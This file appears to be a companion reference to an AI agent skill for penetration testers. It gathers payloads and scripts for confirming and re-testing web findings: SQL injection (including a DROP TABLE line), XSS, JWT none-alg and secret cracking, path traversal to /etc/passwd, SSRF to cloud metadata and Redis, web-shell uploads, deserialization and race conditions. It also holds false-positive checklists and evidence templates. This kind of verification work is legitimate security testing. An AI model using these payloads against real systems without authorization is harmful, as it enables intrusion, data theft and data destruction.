# Verification Loop — Payloads & Commands

> Companion to `SKILL.md`. Contains verification payloads, confirmation commands, and false positive elimination checklists organized by finding type.

---

## Quick Start Checklist

```
1. Pre-condition check → 2. Execute & observe → 3. Post-condition → 4. Independent confirm → 5. FP eliminate → 6. Document
```

---

## SQL Injection Verification Payloads

### Error-Based SQLi Confirmation

```bash
# Original payload
curl -s "http://target/page?id=1' OR 1=1--"

# Independent confirmation — different payload
curl -s "http://target/page?id=1' UNION SELECT NULL,NULL,NULL--"
curl -s "http://target/page?id=1' AND 1=CONVERT(int,(SELECT @@version))--"
curl -s "http://target/page?id=1'; SELECT pg_sleep(5)--"

# SQLmap verification (different tool)
sqlmap -u "http://target/page?id=1" --batch --level=3 --risk=2 --dbs
```

### Blind SQLi Confirmation

```bash
# Time-based verification
curl -s -o /dev/null -w "%{time_total}" "http://target/page?id=1' AND SLEEP(5)--"
# Expected: response time > 5 seconds

# Boolean-based verification
curl -s "http://target/page?id=1' AND 1=1--" | wc -c
curl -s "http://target/page?id=1' AND 1=2--" | wc -c
# Expected: different response lengths
```

---

## XSS Verification Payloads

### Reflected XSS Confirmation

```bash
# Original payload
curl -s "http://target/search?q=<script>alert(1)</script>"

# Independent confirmation — different vectors
curl -s "http://target/search?q=<img src=x onerror=alert(1)>"
curl -s "http://target/search?q=<svg onload=alert(1)>"
curl -s "http://target/search?q=\"><script>alert(1)</script>"
curl -s "http://target/search?q=javascript:alert(1)"

# Browser-based confirmation (use with browser DevTools)
# Navigate to: http://target/search?q=<script>alert(document.domain)</script>
```

### Stored XSS Confirmation

```bash
# Submit payload via API
curl -s -X POST http://target/api/comments \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(1)</script>"}'

# Verify persistence — retrieve from different session
curl -s -b "session=different_user" http://target/api/comments
# Expected: payload present in response body
```

### DOM XSS Confirmation

```bash
# Test document.location sink
curl -s "http://target/page#<img src=x onerror=alert(1)>"

# Test document.write sink
curl -s "http://target/page?callback=alert(1)"

# Test innerHTML sink
curl -s "http://target/page?name=<img src=x onerror=alert(1)>"
```

---

## Authentication Bypass Verification

### Session-Based Bypass

```bash
# Original: access admin with user session
curl -s -b "session=user_session_token" http://target/admin/dashboard

# Independent confirmation — different method
curl -s -H "Authorization: Bearer user_token" http://target/admin/api/users
curl -s -H "Cookie: role=admin" http://target/admin/dashboard
curl -s -H "X-Forwarded-For: 127.0.0.1" http://target/admin/dashboard
```

### IDOR Verification

```bash
# Original: access other user's resource
curl -s -b "session=user_A" http://target/api/users/2/profile

# Independent confirmation — different user, same target
curl -s -b "session=user_B" http://target/api/users/2/profile
curl -s -b "session=user_A" http://target/api/users/2/profile -X PUT -d '{"email":"test@test.com"}'

# Mass assignment test
curl -s -b "session=user_A" -X PUT http://target/api/users/me \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### JWT Manipulation

```bash
# Decode JWT
echo "TOKEN_HEADER" | base64 -d 2>/dev/null
echo "TOKEN_PAYLOAD" | base64 -d 2>/dev/null

# None algorithm attack
# Modify header: {"alg":"none","typ":"JWT"}
# Modify payload: {"role":"admin"}
# Reassemble: base64header.base64payload.

# Weak secret brute force
jwt-cracker "jwt_token_here" -d /usr/share/wordlists/rockyou.txt
```

---

## Network Vulnerability Verification

### Service Version Verification

```bash
# Original: nmap service detection
nmap -sV -p 443 target

# Independent confirmation — different tool
nc -v target 443
curl -sI https://target
openssl s_client -connect target:443 -servername target </dev/null

# Version-specific exploit check
searchsploit <service_name> <version>
```

### TLS/SSL Verification

```bash
# Comprehensive TLS check
nmap --script ssl-enum-ciphers -p 443 target
sslyze --regular target

# Certificate verification
openssl s_client -connect target:443 -servername target </dev/null | openssl x509 -noout -dates -issuer

# Heartbleed check
nmap --script ssl-heartbleed -p 443 target
```

---

## False Positive Elimination Checklist

### Environment-Specific Check

```markdown
## FP Elimination: Environment
- [ ] Does this work from a different IP address?
- [ ] Does this work from a different network position?
- [ ] Does this work against a different instance of the same application?
- [ ] Is the vulnerability present in both development and staging?
- [ ] Does this require a specific OS or browser?
```

### Timing-Dependent Check

```markdown
## FP Elimination: Timing
- [ ] Can this be reproduced consistently (3/3 attempts)?
- [ ] Does it work without race conditions?
- [ ] Is the delay measurable and consistent?
- [ ] Does it work at different times of day?
```

### Privilege-Dependent Check

```markdown
## FP Elimination: Privilege
- [ ] Does this work as an unauthenticated user?
- [ ] Does this work as a low-privilege authenticated user?
- [ ] Does this work without any special headers or cookies?
- [ ] Is the access level actually elevated or just appearing so?
```

### Configuration-Dependent Check

```markdown
## FP Elimination: Configuration
- [ ] Does this work with default application settings?
- [ ] Does this work with different WAF configurations?
- [ ] Is this dependent on debug mode being enabled?
- [ ] Is this dependent on a specific feature flag?
```

### Tool Artifact Check

```markdown
## FP Elimination: Tool Artifact
- [ ] Can this be reproduced with a different tool?
- [ ] Can this be reproduced with manual curl/browser testing?
- [ ] Is the tool injecting headers or parameters that trigger the behavior?
- [ ] Does the raw response (without tool parsing) confirm the finding?
```

---

## Remediation Verification Payloads

### SQL Injection — Patch Verification

```bash
# Re-test original payload (should fail)
curl -s "http://target/page?id=1' OR 1=1--"
# Expected: error or sanitized response, NOT data dump

# Re-test variant payloads (should also fail)
curl -s "http://target/page?id=1' UNION SELECT NULL--"
curl -s "http://target/page?id=1; DROP TABLE users--"
sqlmap -u "http://target/page?id=1" --batch --level=5
# Expected: all injection attempts fail

# Verify parameterized queries
curl -s "http://target/page?id=1" -v 2>&1 | grep -i "parameterized"
```

### XSS — Patch Verification

```bash
# Re-test original payload
curl -s "http://target/search?q=<script>alert(1)</script>"
# Expected: HTML-encoded output, script tag not rendered

# Test bypass attempts
curl -s "http://target/search?q=<ScRiPt>alert(1)</ScRiPt>"
curl -s "http://target/search?q=<script\x00>alert(1)</script>"
curl -s "http://target/search?q={{7*7}}"  # Template injection check
# Expected: all bypasses fail
```

### Access Control — Patch Verification

```bash
# Re-test original bypass
curl -s -b "session=low_priv_user" http://target/admin/dashboard
# Expected: 403 Forbidden or redirect to login

# Test variant access methods
curl -s -b "session=low_priv_user" http://target/admin/api/users
curl -s -b "session=low_priv_user" -H "X-Original-URL: /admin" http://target/
curl -s -b "session=low_priv_user" -X POST http://target/admin/api/users
# Expected: all access denied
```

---

## Evidence Capture Templates

### Verification Evidence Template

```markdown
## Verification Evidence: [FINDING-ID]

### Original Finding
- **Type**: [SQLi/XSS/Auth Bypass/Network/Other]
- **Location**: [URL/endpoint/port]
- **Original tool**: [Tool that found it]
- **Original payload**: [Exact payload used]

### Independent Confirmation
- **Confirmation tool**: [Different tool used]
- **Confirmation payload**: [Different payload used]
- **Confirmation result**: [Output/evidence]

### False Positive Analysis
- Environment-specific: [Y/N] — Evidence:
- Timing-dependent: [Y/N] — Evidence:
- Privilege-dependent: [Y/N] — Evidence:
- Configuration-dependent: [Y/N] — Evidence:
- Tool artifact: [Y/N] — Evidence:

### Final Verdict
- **Status**: [CONFIRMED / NOT CONFIRMED / PARTIALLY CONFIRMED]
- **Confidence**: [High / Medium / Low]
- **Severity**: [Critical / High / Medium / Low / Info]
```

---

## Automated Verification Scripts

### Batch Verification Runner
```bash
#!/bin/bash
# Run all verification checks for a finding
TARGET="$1"
FINDING_TYPE="$2"

echo "[*] Verifying $FINDING_TYPE on $TARGET"
echo "---"

case "$FINDING_TYPE" in
  sqli)
    sqlmap -u "$TARGET" --batch --level=3 --risk=2 --technique=BEUSTQ
    ;;
  xss)
    echo "<script>alert(1)</script>" | curl -s -d "input=$(cat -)" "$TARGET" | grep -c "<script>"
    ;;
  lfi)
    for payload in "../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2fetc%2fpasswd"; do
      curl -s "$TARGET?file=$payload" | grep -q "root:" && echo "CONFIRMED: $payload"
    done
    ;;
esac
```

### HTTP Response Comparison
```python
import requests
import difflib

def compare_responses(url, payload_normal, payload_attack):
    r_normal = requests.get(url, params={"input": payload_normal})
    r_attack = requests.get(url, params={"input": payload_attack})
    
    diff = difflib.unified_diff(
        r_normal.text.splitlines(),
        r_attack.text.splitlines(),
        lineterm=""
    )
    
    return {
        "status_diff": r_normal.status_code != r_attack.status_code,
        "length_diff": abs(len(r_normal.text) - len(r_attack.text)),
        "content_diff": list(diff)[:20],
    }
```

### Timing-Based Verification
```python
import time
import requests

def verify_time_based(url, param, sleep_seconds=5):
    # Baseline
    start = time.time()
    requests.get(url, params={param: "normal_value"})
    baseline = time.time() - start
    
    # Payload with sleep
    payload = f"' OR SLEEP({sleep_seconds})-- -"
    start = time.time()
    requests.get(url, params={param: payload})
    attack_time = time.time() - start
    
    delta = attack_time - baseline
    confirmed = delta >= (sleep_seconds * 0.8)
    
    return {
        "baseline_ms": int(baseline * 1000),
        "attack_ms": int(attack_time * 1000),
        "delta_ms": int(delta * 1000),
        "confirmed": confirmed,
    }
```

### SSL/TLS Verification
```bash
# Check certificate validity
echo | openssl s_client -connect "$TARGET:443" 2>/dev/null | openssl x509 -noout -dates

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 "$TARGET"

# Check HSTS header
curl -sI "https://$TARGET" | grep -i "strict-transport"

# Test for SSL stripping
curl -sI "http://$TARGET" | grep -i "location"
```

### DNS Verification
```bash
# Verify DNS rebinding
dig +short "$TARGET"
sleep 5
dig +short "$TARGET"
# Compare results — if different, DNS rebinding possible

# Check for zone transfer
dig axfr @"$NS_SERVER" "$DOMAIN"

# Verify subdomain takeover
dig CNAME "$SUBDOMAIN" | grep -i "NXDOMAIN\|not found"
```

### Port/Service Verification
```bash
# Verify open port with multiple tools
nmap -sV -p "$PORT" "$TARGET"
nc -zv "$TARGET" "$PORT" 2>&1
curl -s "http://$TARGET:$PORT/" -o /dev/null -w "%{http_code}"

# Banner grab for service confirmation
echo "" | nc -w 3 "$TARGET" "$PORT"
```

### Remediation Verification
```bash
# Verify patch applied
# Before: vulnerable version
curl -s "http://$TARGET/api/version" | jq '.version'

# Apply patch (out of band)

# After: patched version
curl -s "http://$TARGET/api/version" | jq '.version'

# Re-run original exploit — should fail
sqlmap -u "$TARGET" --batch --technique=U 2>&1 | grep -c "not injectable"
```

### Evidence Collection
```bash
# Screenshot with timestamp
DATE=$(date +%Y%m%d_%H%M%S)
curl -s "$TARGET" -o "evidence/${DATE}_response.html"
echo "$DATE | $TARGET | $FINDING" >> evidence/verification_log.csv

# HAR capture
chromium --headless --disable-gpu --print-to-pdf="evidence/${DATE}.pdf" "$TARGET"
```

---

## Multi-Phase Verification

### Three-Phase Confirmation Protocol

```bash
#!/bin/bash
# Three-phase verification: initial, confirm, independent

TARGET="$1"
PARAM="$2"
FINDING_TYPE="$3"
EVIDENCE_DIR="evidence/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[Phase 1] Initial Discovery"
case "$FINDING_TYPE" in
  sqli)
    curl -s "$TARGET?$PARAM=1'+OR+1=1--" -o "$EVIDENCE_DIR/phase1_response.html"
    ;;
  xss)
    curl -s "$TARGET?$PARAM=<script>alert(1)</script>" -o "$EVIDENCE_DIR/phase1_response.html"
    ;;
  lfi)
    curl -s "$TARGET?$PARAM=../../../etc/passwd" -o "$EVIDENCE_DIR/phase1_response.html"
    ;;
esac

echo "[Phase 2] Confirm with Different Payload"
case "$FINDING_TYPE" in
  sqli)
    sqlmap -u "$TARGET?$PARAM=1" --batch --level=3 -o --output-dir="$EVIDENCE_DIR/sqlmap"
    ;;
  xss)
    curl -s "$TARGET?$PARAM=<img src=x onerror=alert(1)>" -o "$EVIDENCE_DIR/phase2_response.html"
    ;;
  lfi)
    curl -s "$TARGET?$PARAM=....//....//etc/passwd" -o "$EVIDENCE_DIR/phase2_response.html"
    ;;
esac

echo "[Phase 3] Independent Tool Verification"
case "$FINDING_TYPE" in
  sqli)
    nuclei -u "$TARGET" -t ~/nuclei-templates/vulnerabilities/generic/sqli-basic.yaml -o "$EVIDENCE_DIR/nuclei_results.txt"
    ;;
  xss)
    dalfox url "$TARGET?$PARAM=test" -o "$EVIDENCE_DIR/dalfox_results.txt"
    ;;
esac

echo "[*] Evidence saved to $EVIDENCE_DIR/"
```

---

## Automated Re-Testing

### Regression Test Runner

```python
#!/usr/bin/env python3
"""Re-run all previously confirmed findings after a patch cycle."""
import json
import requests
import sys
from datetime import datetime

def rerun_test(finding):
    """Re-execute the original PoC and check if still vulnerable."""
    poc = finding["poc"]
    method = poc.get("method", "GET")
    url = poc["url"]
    headers = poc.get("headers", {})
    body = poc.get("body")

    try:
        if method == "GET":
            resp = requests.get(url, headers=headers, timeout=15)
        else:
            resp = requests.post(url, headers=headers, data=body, timeout=15)

        indicators = poc.get("success_indicators", [])
        still_vulnerable = any(ind in resp.text for ind in indicators)

        return {
            "finding_id": finding["id"],
            "status": "STILL VULNERABLE" if still_vulnerable else "PATCHED",
            "http_code": resp.status_code,
            "timestamp": datetime.now().isoformat(),
        }
    except Exception as e:
        return {
            "finding_id": finding["id"],
            "status": "ERROR",
            "error": str(e),
            "timestamp": datetime.now().isoformat(),
        }

def main(findings_file):
    with open(findings_file) as f:
        findings = json.load(f)

    results = []
    for finding in findings:
        result = rerun_test(finding)
        results.append(result)
        print(f"[{result['status']}] {finding['id']}: {finding['title']}")

    patched = sum(1 for r in results if r["status"] == "PATCHED")
    total = len(results)
    print(f"\nSummary: {patched}/{total} findings patched")

main(sys.argv[1])
```

---

## Regression Detection

### Response Baseline Comparison

```python
#!/usr/bin/env python3
"""Compare current responses against known-good baselines to detect regressions."""
import hashlib
import json
import requests
import sys

def compute_fingerprint(response_text):
    """Create a normalized fingerprint of response content."""
    normalized = response_text.strip().lower()
    return hashlib.sha256(normalized.encode()).hexdigest()

def check_regression(url, baseline_file):
    with open(baseline_file) as f:
        baselines = json.load(f)

    results = []
    for entry in baselines:
        resp = requests.get(
            url,
            params=entry.get("params"),
            headers=entry.get("headers", {}),
            timeout=15,
        )
        current_fp = compute_fingerprint(resp.text)
        baseline_fp = entry["fingerprint"]
        match = current_fp == baseline_fp

        results.append({
            "endpoint": entry["endpoint"],
            "params": entry.get("params"),
            "baseline_hash": baseline_fp[:16],
            "current_hash": current_fp[:16],
            "status": "MATCH" if match else "REGRESSION",
            "http_code": resp.status_code,
        })

    return results

if __name__ == "__main__":
    results = check_regression(sys.argv[1], sys.argv[2])
    for r in results:
        print(f"[{r['status']}] {r['endpoint']} params={r['params']}")
```

---

## Evidence Collection

### Full Evidence Capture Script

```bash
#!/bin/bash
# Capture comprehensive evidence for a verified finding
FINDING_ID="$1"
TARGET="$2"
EVIDENCE_DIR="evidence/$FINDING_ID/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[*] Capturing evidence for $FINDING_ID"

# HTTP request/response with full headers
curl -v -s -i "$TARGET" -o "$EVIDENCE_DIR/full_response.txt" 2>&1

# Headers only
curl -sI "$TARGET" > "$EVIDENCE_DIR/headers.txt"

# Response body
curl -s "$TARGET" > "$EVIDENCE_DIR/body.html"

# SSL/TLS certificate
echo | openssl s_client -connect "$(echo $TARGET | sed 's|https\?://||' | cut -d/ -f1):443" 2>/dev/null \
  | openssl x509 -noout -text > "$EVIDENCE_DIR/cert_info.txt" 2>/dev/null

# DNS resolution
dig "$(echo $TARGET | sed 's|https\?://||' | cut -d/ -f1)" > "$EVIDENCE_DIR/dns.txt" 2>/dev/null

# Timestamp and hash
date -u > "$EVIDENCE_DIR/timestamp.txt"
sha256sum "$EVIDENCE_DIR"/* > "$EVIDENCE_DIR/checksums.sha256"

echo "[*] Evidence saved to $EVIDENCE_DIR/"
ls -la "$EVIDENCE_DIR/"
```

---

## False Positive Filtering

### Automated FP Classification

```python
#!/usr/bin/env python3
"""Automatically classify findings as likely true positives or false positives."""
import json
import re
import sys

FP_INDICATORS = [
    (r"error\.html", "Generic error page returned"),
    (r"404|not found", "Page not found"),
    (r"waf|blocked|forbidden", "WAF or proxy intercepted"),
    (r"captcha|challenge", "Bot challenge page"),
    (r"maintenance|down", "Service in maintenance mode"),
]

TP_INDICATORS = [
    (r"root:[x*]:0:0", "Valid passwd file content"),
    (r"uid=\d+\(", "Command execution output"),
    (r"admin.*logged.?in", "Successful admin access"),
    (r"script.*alert", "Reflected XSS payload"),
]

def classify_finding(finding):
    response = finding.get("response_body", "").lower()
    status_code = finding.get("status_code", 0)

    for pattern, reason in FP_INDICATORS:
        if re.search(pattern, response):
            return {"verdict": "FALSE_POSITIVE", "reason": reason}

    for pattern, reason in TP_INDICATORS:
        if re.search(pattern, response):
            return {"verdict": "TRUE_POSITIVE", "reason": reason}

    if status_code in (200, 201, 301, 302):
        return {"verdict": "NEEDS_MANUAL_REVIEW", "reason": "Response indicates success but no clear indicator"}
    return {"verdict": "INCONCLUSIVE", "reason": "Could not classify automatically"}

if __name__ == "__main__":
    with open(sys.argv[1]) as f:
        findings = json.load(f)
    for f in findings:
        result = classify_finding(f)
        print(f"[{result['verdict']}] {f.get('id', 'unknown')}: {result['reason']}")
```

---

## Continuous Verification

### Scheduled Verification Cron

```bash
#!/bin/bash
# Set up continuous verification of previously confirmed findings
# Run via cron: 0 */6 * * * /path/to/continuous_verify.sh

FINDINGS_DB="findings/confirmed.json"
RESULTS_DIR="verification_results/$(date +%Y%m%d)"
mkdir -p "$RESULTS_DIR"

python3 -c "
import json, requests, sys
from datetime import datetime

with open('$FINDINGS_DB') as f:
    findings = json.load(f)

results = []
for f in findings:
    try:
        resp = requests.get(f['url'], headers=f.get('headers', {}), timeout=10)
        vulnerable = any(ind in resp.text for ind in f.get('indicators', []))
        results.append({
            'id': f['id'],
            'vulnerable': vulnerable,
            'status_code': resp.status_code,
            'checked_at': datetime.now().isoformat()
        })
        status = 'VULNERABLE' if vulnerable else 'SAFE'
        print(f'[{status}] {f[\"id\"]}')
    except Exception as e:
        results.append({'id': f['id'], 'error': str(e)})

with open('$RESULTS_DIR/results.json', 'w') as out:
    json.dump(results, out, indent=2)
"
```

### Webhook Alert on Regression

```python
#!/usr/bin/env python3
"""Send alert when a previously patched finding regresses."""
import json
import requests
import sys

WEBHOOK_URL = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

def send_regression_alert(finding_id, title, url):
    payload = {
        "text": f":rotating_light: REGRESSION DETECTED\n"
                f"Finding: {finding_id} - {title}\n"
                f"URL: {url}\n"
                f"A previously patched vulnerability is exploitable again."
    }
    requests.post(WEBHOOK_URL, json=payload)

if __name__ == "__main__":
    finding = json.load(open(sys.argv[1]))
    send_regression_alert(finding["id"], finding["title"], finding["url"])
```

---

## Header Security Verification

### Security Header Audit

```bash
#!/bin/bash
# Comprehensive security header verification
TARGET="$1"

echo "[*] Auditing security headers for $TARGET"
HEADERS=$(curl -sI "$TARGET")

check_header() {
  local name="$1"
  local expected="$2"
  local actual=$(echo "$HEADERS" | grep -i "^$name:" | head -1)
  if [ -z "$actual" ]; then
    echo "[MISSING] $name header not present"
  elif [ -n "$expected" ] && ! echo "$actual" | grep -qi "$expected"; then
    echo "[WEAK] $name: $actual (expected: $expected)"
  else
    echo "[OK] $actual"
  fi
}

check_header "Strict-Transport-Security" "max-age="
check_header "Content-Security-Policy" ""
check_header "X-Content-Type-Options" "nosniff"
check_header "X-Frame-Options" ""
check_header "X-XSS-Protection" ""
check_header "Referrer-Policy" ""
check_header "Permissions-Policy" ""
check_header "Cache-Control" "no-store"
```

### CORS Configuration Verification

```bash
#!/bin/bash
# Verify CORS is not overly permissive
TARGET="$1"

echo "[*] Testing CORS configuration..."

# Test wildcard origin (should be rejected for authenticated endpoints)
curl -sI -H "Origin: https://evil.com" "$TARGET/api/users" | grep -i "access-control-allow-origin"

# Test null origin
curl -sI -H "Origin: null" "$TARGET/api/users" | grep -i "access-control-allow-origin"

# Test subdomain takeover potential
curl -sI -H "Origin: https://fake.target.com" "$TARGET/api/users" | grep -i "access-control-allow-origin"

# Test credential exposure
curl -sI -H "Origin: https://evil.com" "$TARGET/api/users" | grep -i "access-control-allow-credentials"
```

---

## API Endpoint Verification

### Parameter Tampering Verification

```bash
#!/bin/bash
# Verify parameter tampering is properly handled
TARGET="$1"
TOKEN="$2"

echo "[*] Testing parameter tampering controls..."

# Test type confusion
curl -s "$TARGET/api/users?id[]=1&id[]=2" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/users?id=1 OR 1=1" -H "Authorization: Bearer $TOKEN"

# Test negative IDs
curl -s "$TARGET/api/users/-1" -H "Authorization: Bearer $TOKEN"

# Test very large numbers
curl -s "$TARGET/api/users/999999999999" -H "Authorization: Bearer $TOKEN"

# Test UUID vs integer confusion
curl -s "$TARGET/api/users/not-a-valid-uuid" -H "Authorization: Bearer $TOKEN"
```

### HTTP Method Verification

```bash
#!/bin/bash
# Verify all HTTP methods are properly handled
TARGET="$1"
TOKEN="$2"

for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "$TARGET/api/users" \
    -H "Authorization: Bearer $TOKEN")
  echo "[$method] HTTP $code"
done

# Verify TRACE is disabled (XST vulnerability)
TRACE_RESP=$(curl -s -X TRACE "$TARGET")
if [ -n "$TRACE_RESP" ]; then
  echo "[!] WARNING: TRACE method returns data (potential XST)"
fi
```

---

## Websocket Verification

### WebSocket Authentication Verification

```bash
#!/bin/bash
# Verify WebSocket endpoints require authentication

# Test unauthenticated WebSocket connection
python3 -c "
import asyncio
import websockets

async def test_ws():
    uri = 'wss://target.com/ws'
    try:
        async with websockets.connect(uri) as ws:
            await ws.send('test')
            resp = await ws.recv()
            print(f'[VULNERABLE] Unauthenticated WS accepted: {resp}')
    except Exception as e:
        print(f'[OK] WS rejected: {e}')

asyncio.run(test_ws())
"
```

### WebSocket Input Validation Testing

```python
#!/usr/bin/env python3
"""Test WebSocket endpoints for input validation."""
import asyncio
import websockets
import json

PAYLOADS = [
    json.dumps({"type": "eval", "data": "1+1"}),          # Code injection
    json.dumps({"type": "cmd", "data": "id"}),             # Command injection
    "A" * 100000,                                            # Buffer overflow
    json.dumps({"type": "../../../etc/passwd"}),            # Path traversal
    "<script>alert(1)</script>",                             # XSS
]

async def test_ws_validation(uri):
    async with websockets.connect(uri) as ws:
        for payload in PAYLOADS:
            try:
                await ws.send(payload)
                resp = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"[RESPONSE] Payload ({payload[:40]}...): {str(resp)[:100]}")
            except Exception as e:
                print(f"[REJECTED] Payload ({payload[:40]}...): {e}")

asyncio.run(test_ws_validation("wss://target.com/ws"))
```

---

## File Upload Verification

### Upload Bypass Testing

```bash
#!/bin/bash
# Verify file upload restrictions are properly enforced

TARGET="https://target.com/api/upload"
TOKEN="Bearer $1"

# Test PHP file upload with double extension
curl -s -X POST "$TARGET" -H "Authorization: $TOKEN" \
  -F "file=@shell.php.jpg" -o /dev/null -w "%{http_code}"

# Test with content-type manipulation
curl -s -X POST "$TARGET" -H "Authorization: $TOKEN" \
  -H "Content-Type: image/jpeg" \
  -F "file=@shell.php" -o /dev/null -w "%{http_code}"

# Test SVG with embedded JavaScript
echo '<?xml version="1.0"?><svg onload="alert(1)"><circle r="50"/></svg>' > /tmp/test.svg
curl -s -X POST "$TARGET" -H "Authorization: $TOKEN" \
  -F "file=@/tmp/test.svg" -o /dev/null -w "%{http_code}"

# Test null byte extension bypass
cp shell.php 'shell.php%00.jpg'
curl -s -X POST "$TARGET" -H "Authorization: $TOKEN" \
  -F "file=@shell.php%00.jpg" -o /dev/null -w "%{http_code}"
```

---

## SSRF Verification

### SSRF Confirmation Payloads

```bash
#!/bin/bash
# Confirm SSRF with multiple independent techniques
TARGET_URL="https://target.com/api/fetch"

# Test 1: Cloud metadata access
curl -s -X POST "$TARGET_URL" -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | head -5

# Test 2: Localhost service enumeration
curl -s -X POST "$TARGET_URL" -d '{"url":"http://127.0.0.1:22/"}' -o /dev/null -w "SSH: %{http_code}\n"
curl -s -X POST "$TARGET_URL" -d '{"url":"http://127.0.0.1:3306/"}' -o /dev/null -w "MySQL: %{http_code}\n"
curl -s -X POST "$TARGET_URL" -d '{"url":"http://127.0.0.1:6379/"}' -o /dev/null -w "Redis: %{http_code}\n"
curl -s -X POST "$TARGET_URL" -d '{"url":"http://127.0.0.1:8080/"}' -o /dev/null -w "App: %{http_code}\n"

# Test 3: DNS rebinding confirmation
curl -s -X POST "$TARGET_URL" -d '{"url":"http://a.b.c.d.ns.target.com/"}'
```

### SSRF via Different Protocols

```bash
# Test SSRF via different URL schemes
curl -s -X POST "$TARGET_URL" -d '{"url":"file:///etc/passwd"}'
curl -s -X POST "$TARGET_URL" -d '{"url":"gopher://127.0.0.1:6379/_INFO"}'
curl -s -X POST "$TARGET_URL" -d '{"url":"dict://127.0.0.1:6379/INFO"}'
```

---

## Business Logic Verification

### Price Manipulation Testing

```bash
#!/bin/bash
# Verify price tampering is prevented
TARGET="https://target.com/api"
TOKEN="Bearer $1"

# Test negative price
curl -s -X POST "$TARGET/cart/add" -H "Authorization: $TOKEN" \
  -d '{"product_id": 1, "price": -10.00, "quantity": 1}'

# Test zero price
curl -s -X POST "$TARGET/cart/add" -H "Authorization: $TOKEN" \
  -d '{"product_id": 1, "price": 0, "quantity": 1}'

# Test quantity manipulation
curl -s -X POST "$TARGET/cart/add" -H "Authorization: $TOKEN" \
  -d '{"product_id": 1, "price": 9.99, "quantity": -1}'

# Test currency manipulation
curl -s -X POST "$TARGET/cart/checkout" -H "Authorization: $TOKEN" \
  -d '{"currency": "USD", "exchange_rate": 0.01}'
```

### Concurrency Verification

```python
#!/usr/bin/env python3
"""Verify race conditions in critical business logic."""
import asyncio
import aiohttp

async def race_test(endpoint, payload, concurrency=20):
    """Send concurrent requests to test for race conditions."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(endpoint, json=payload)
            for _ in range(concurrency)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        successes = sum(
            1 for r in responses
            if not isinstance(r, Exception) and r.status == 200
        )
        print(f"Race test: {successes}/{concurrency} succeeded")
        if successes > 1:
            print("[!] RACE CONDITION: Multiple successes on single-use action")
        return successes

asyncio.run(race_test(
    "https://target.com/api/voucher/redeem",
    {"code": "ONE_TIME_USE_CODE"},
))
```

---

## Session Management Verification

### Session Fixation Testing

```bash
#!/bin/bash
# Test for session fixation vulnerabilities

# Step 1: Get a session token without authenticating
UNAUTH_SESSION=$(curl -sI https://target.com/login | grep -i "set-cookie" | head -1)
echo "Unauth session: $UNAUTH_SESSION"

# Step 2: Force this session on a victim (via link or XSS)
# Step 3: Victim authenticates with this session
curl -s -X POST https://target.com/login \
  -H "Cookie: session=FIXED_SESSION_ID" \
  -d "user=victim&pass=victim_password"

# Step 4: Attacker uses the same session (should fail if properly implemented)
curl -s -b "session=FIXED_SESSION_ID" https://target.com/api/profile
```

---

## Clickjacking Verification

### Frame Busting Bypass Testing

```bash
#!/bin/bash
# Verify clickjacking protections

TARGET="$1"

# Check X-Frame-Options header
XFO=$(curl -sI "$TARGET" | grep -i "x-frame-options")
if [ -z "$XFO" ]; then
  echo "[!] MISSING: X-Frame-Options header not set"
else
  echo "[OK] $XFO"
fi

# Check CSP frame-ancestors
CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | grep -o "frame-ancestors[^;]*")
if [ -z "$CSP" ]; then
  echo "[!] MISSING: CSP frame-ancestors directive not set"
else
  echo "[OK] $CSP"
fi
```

### Clickjacking PoC Generator

```html
<!-- Generate clickjacking PoC for verification -->
<html>
<head><title>Clickjacking Verification</title></head>
<body>
<h1>Clickjacking PoC</h1>
<iframe src="$TARGET_URL" width="800" height="600"
  style="opacity:0.5; position:absolute; top:50px; left:50px;">
</iframe>
<div style="position:absolute; top:100px; left:100px; z-index:999;">
  <button>Click Me (visible overlay)</button>
</div>
</body>
</html>
```

---

## Deserialization Verification

### Insecure Deserialization Checks

```bash
#!/bin/bash
# Test for insecure deserialization endpoints

TARGET="$1"
TOKEN="$2"

# Java serialization magic bytes test
printf '\xac\xed\x00\x05' | curl -s -X POST "$TARGET/api/data" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary @- -w "\nHTTP: %{http_code}\n"

# PHP deserialization test
curl -s "$TARGET/api/session" \
  -H "Cookie: session=O:8:\"stdClass\":0:{}" \
  -w "\nHTTP: %{http_code}\n"

# JSON deserialization type confusion
curl -s -X POST "$TARGET/api/config" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}' \
  -w "\nHTTP: %{http_code}\n"
```
